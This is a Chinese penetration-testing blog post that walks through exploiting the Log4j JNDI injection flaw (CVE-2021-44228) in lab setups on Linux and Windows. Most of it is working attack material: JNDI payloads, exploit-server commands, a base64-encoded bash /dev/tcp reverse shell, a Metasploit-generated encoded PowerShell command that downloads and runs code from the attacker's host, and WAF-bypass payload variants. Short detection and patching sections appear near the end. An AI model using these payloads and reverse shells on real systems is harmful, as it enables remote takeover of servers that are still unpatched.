# CVE-2021-44228-Apache-Log4j-Rce 漏洞反弹 win&linux - 渗透测试中心 - 博客园

> 原文：[`www.cnblogs.com/backlion/p/15686831.html`](https://www.cnblogs.com/backlion/p/15686831.html)

### 0x00  漏洞描述

Apache Log4j 是 Apache 的一个开源项目，Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI 组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。该日志框架被大量用于业务系统开发，用来记录日志信息。
Log4j-2 中存在 JNDI 注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞

### 0x01  影响范围

Apache Log4j 2.x < 2.15.0-rc2
已知受影响组件
1、Apache Struts2
2、Apache Solr
3、Apache Flink
4、Apache Druid
5、ElasticSearch
6、flume
7、dubbo
8、Redis
9、logstash
10、kafka
11.vmvare12.Spring-Boot-strater-log4j2

### 0x02  环境搭建

#### 一、linux 环境搭建

linxu 环境下目前 Vulfocus 已经集成 Log4j2，可通过以下链接启动在线环境测试：
[`vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c`](http://vulfocus.fofa.so/#/dashboard?image_id=3b8f15eb-7bd9-49b2-a69e-541f89c4216c)
也可通过 docker pull vulfocus/log4j2-rce-2021-12-09:latest 拉取本地环境运行![](img/68057279c8c6ca89fd635eceb723cfe1.png)启动 dokcer 环境 docker run  -d    -p  8080:8080   vulfocus/log4j2-rce-2021-12-09:latest![](img/b21b14ff45f5ec5011112f0041ac74af.png)http://192.168.1.4:8080/![](img/71c5b4f42381479ba4b3134556c42396.png)

### 二、win 本地环境

本地环境：java 版本 8u181，tomcat8.5.32 源码包：链接：https://pan.baidu.com/s/1STgDdVb4QUm9r0t9wZZA-Q 提取码：uodm![](img/d3f7502aaa4a98ba3f8fb32cd3d465dd.png)ROOT.war 为 Tomcat 启动包，删除 webapps 目录下的 ROOT 目录，将 ROOT.war 放入 Tomcat 的 webapps 目录下，启动 Tomcat 即可![](img/5d4cf7e5a299d44649a0ae4ee2251bec.png)![](img/cb97445ec11d704b49d17b0d9930a8a5.png)

### 0x03 漏洞利用

#### 一、linux 环境下 dnslog 回显

注意：Content-Type: application/x-www-form-urlencodedpost:
payload=${jndi:ldap://ti851c.dnslog.cn}![](img/24d0041b34ca0dffa29568488db2af2d.png)dnslog 回显：![](img/f3e136fd893e82b8b9c13a58909f3179.png)

#### 二、win 环境下 dnslog 回显

注意：Content-Type: application/x-www-form-urlencodedpost:
payload=${jndi:ldap://ti851c.dnslog.cn}

#### ![](img/7d2bf1482c41384d4504c32dfd65be62.png)dnslog 回显：![](img/0993de903b9762181048a40487d949e1.png) 

#### 三、linux 环境下命令回显

注意 Content-Type: application/x-www-form-urlencoded
payload=${jndi:ldap://192.168.1.14:2222/TomcatBypass/TomcatEcho}
这里用到 JNDIExploit-1.2-SNAPSHOT.jar 工具启一个 ldap 服务[`download1320.mediafire.com/8nkrfr49l20g/dm0qgwujkwcy585/JNDIExploit.v1.2.zip`](https://download1320.mediafire.com/8nkrfr49l20g/dm0qgwujkwcy585/JNDIExploit.v1.2.zip)java -jar JNDIExploit-1.2-SNAPSHOT.jar -l 2222  -p 8988 -i 0.0.0.0![](img/92c142e21e72b0ad264730d3373a107d.png)执行，成功回显![](img/9f0b9272e419adda1f9e12714021cc1f.png)![](img/fc61a547b4cd6449d40a58acc668e194.png)

#### 四、win 环境下命令回显

#### 1.注意 Content-Type: application/x-www-form-urlencoded
这里用到 JNDIExploit-1.2-SNAPSHOT.jar 工具启一个 ldap 服务

[`download1320.mediafire.com/8nkrfr49l20g/dm0qgwujkwcy585/JNDIExploit.v1.2.zip`](https://download1320.mediafire.com/8nkrfr49l20g/dm0qgwujkwcy585/JNDIExploit.v1.2.zip)

java -jar JNDIExploit-1.2-SNAPSHOT.jar -l 2222  -p 8988 -i 0.0.0.0

![](img/c700fe2668ae558fcf8c1f65424866a8.png)2.这个是输入的 payload:${jndi:ldap://10.206.14.240:2222/Basic/TomcatEcho}，使用的话 IP 修改为自己的起 JNDI 服务的 IP 即可,将刚才的包放入 repeater，执行命令，添加自定义的 header，cmd:whoami 来执行 ![](img/c762bf01bfac58c27bf474a03332bf3a.png) 执行命令，并发送数据包，成功回显  ![](img/e74a06f933597fbff526cb36876feb65.png)

#### 五、linux 环境下反弹 shell

1.JDK 下载与安装（需要 JDK1.8121 版本以下）JDK 下载地址：[`www.oracle.com/java/technologies/javase/javase8-archive-downloads.html`](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html)![](img/6ad9494eff2441029e9a282bb6ccfb33.png)2.攻击机上执行 linux 进行 nc 反弹监听命令
nc  -nvlp 2333
3.生成 bash 反弹命令的 payload

```
bash -i >& /dev/tcp/192.168.1.14/2333  0>&1
4.在线网站对其 payload 进行编码
https://www.jackson-t.ca/runtime-exec-payloads.html
得到:
```

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMjMzMyAgMD4mMQ==}|{base64,-d}|{bash,-i}
```

```
![](img/89168d7fc111c440c50b366418de978d.png)
```

5.启动一个 ldap 服务

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTQvMjMzMyAgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "192.168.1.14"
```

![](img/7d98d9f1e0aceac6e35e4a584eaa2d85.png)6.发送 payload（这里 ldap 协议不太行，换成 rmi 协议可以）因为 java 版本高于 1.8.0_191 之后，不会默认开启 ldap，所以我们这里需要选择用 rmi 的方式来进行攻击。注意 Content-Type: application/x-www-form-urlencoded

```
payload=${jndi:rmi://192.168.1.14:1099/zxeiar}
```

![](img/977894ba38bf2b9717bd609fac3c0e23.png)7.成功拿到 shell![](img/b1ccd249f346dc6fc6b287ba24042e30.png)

### 六、win 环境下反弹 shell

1.kali 下 msf 生成 powershell

```
use exploit/multi/script/web_delivery set payload payload/windows/x64/powershell_reverse_tcp
```

```
set lhost 10.206.14.54 set target 2 run
```

![](img/0f4e07cb7337bf46fe2f83d7ee71d855.png)![](img/c6bcd5479948b2af6b376fab1b744cc5.png)2.生成的 POCpowershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABZAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAFkALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABZAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAwADYALgAxADQALgA1ADQAOgA4ADAAOAAwAC8ASABKAEYAaABTAHoASQBnAEsAOQAvAGkATgByAHIAagBiAFoAUwBYAGUAMQBQAEUARQBPACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAyADAANgAuADEANAAuADUANAA6ADgAMAA4ADAALwBIAEoARgBoAFMAegBJAGcASwA5ACcAKQApADsA3.本地或 vps 启动服务 github 下载 JNDI-Injection-Exploit  poc:[`github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0`](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)

```
java  -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABZAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAFkALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABZAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMgAwADYALgAxADQALgA1ADQAOgA4ADAAOAAwAC8ASABKAEYAaABTAHoASQBnAEsAOQAvAGkATgByAHIAagBiAFoAUwBYAGUAMQBQAEUARQBPACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAyADAANgAuADEANAAuADUANAA6ADgAMAA4ADAALwBIAEoARgBoAFMAegBJAGcASwA5ACcAKQApADsA" -A "192.168.1.7"
```

![](img/d7ec1834aa957c26ef2ad52fb400a1cc.png)![](img/2f671f7407d32ffe867419a55ff8b569.png)4.协议根据实际情况使用，这里使用 rmi 协议发送数据包。${jndi:rmi://10.206.14.240:1099/6lwxbt}![](img/3ad4319f61feccfe896766da47da4159.png)5.在 msf 中成功反弹 win 本地的 shell.![](img/051fd7d99f2902ad38e8826f2c16b206.png)

### 0x04 判断方式

只需排查 Java 应用是否引入 log4j-api , log4j-core 两个 jar。若存在应用使用，极大可能会受到影响。

### 0x05 漏洞排查

1.代码排查：查看 pom.xml 是否引入 org.apache.logging.log4j、org.apache.logging.log4j2
![](img/4df0ca96729cab96a8106aff8bca0cd7.png)2.linux 下命令排查：

```
sudo find / -name "*log4j-*.jar"
```

![](img/563ce23f086f5ca240b69af01104564f.png)
3.Win 下命令排查：

```
*log4j*.jar
```

![](img/e0077619d4fc8157a5824c75a2734dca.png)4.BurpLog4j2Scan 被动扫描 bp 插件 https://github.com/tangxiaofeng7/BurpLog4j2Scan/releases/download/v1.1/BurpLog4j2Scan-1.0-SNAPSHOT.jar![](img/7c335e4cd53c150c0a0515cf4e2bcc45.png)

### 0x06 修复方式

1、升级版本至 log4j-2.15.0
https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2
2、升级 jdk11.0.1，8u191，7u201，6u211 至更高版本
紧急缓解措施
1、修改 jvm  在启动项添加参数 -Dlog4j2.formatMsgNoLookups=true
2、将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true
3、修改配置 log4j2.formatMsgNoLookups=True

### 0x07 绕过技巧

1.绕过 rc1

```
${jndi:ldap://127.0.0.1:1389/ badClassName}
```

```
2.绕过 WAF
```

```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```

3.rce 对 jdk 版本要求比较严格:rmi 方式 jdk 6u132 7u131 8u121 以前；ldap 方式 jdk11.0.1 8u191 7u201 6u211 以前

### 0x08 参考文献

[`github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce`](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)[`github.com/jas502n/Log4j2-CVE-2021-44228`](https://github.com/jas502n/Log4j2-CVE-2021-44228)[`github.com/0x727/JNDIExploit`](https://github.com/0x727/JNDIExploit)
[`github.com/whwlsfb/Log4j2Scan/`](https://github.com/whwlsfb/Log4j2Scan/)[`github.com/dbgee/log4j2_rce`](https://github.com/dbgee/log4j2_rce)[`github.com/bkfish/Apache-Log4j-Learning`](https://github.com/bkfish/Apache-Log4j-Learning)[`www.o2oxy.cn/3884.html`](https://www.o2oxy.cn/3884.html)[`www.wangt.cc/2021/12/%EF%BC%88%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0%EF%BC%89cve-2021-44228-apache-log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/`](https://www.wangt.cc/2021/12/%EF%BC%88%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0%EF%BC%89cve-2021-44228-apache-log4j-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)[`www.skyzyw.com/article/18855.html`](https://www.skyzyw.com/article/18855.html)[`www.dmkxy.me/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/`](http://www.dmkxy.me/2021/12/10/Apache%20Log4j%20RCE%E6%BC%8F%E6%B4%9E/)[`syunaht.com/p/2341403076.html`](https://syunaht.com/p/2341403076.html)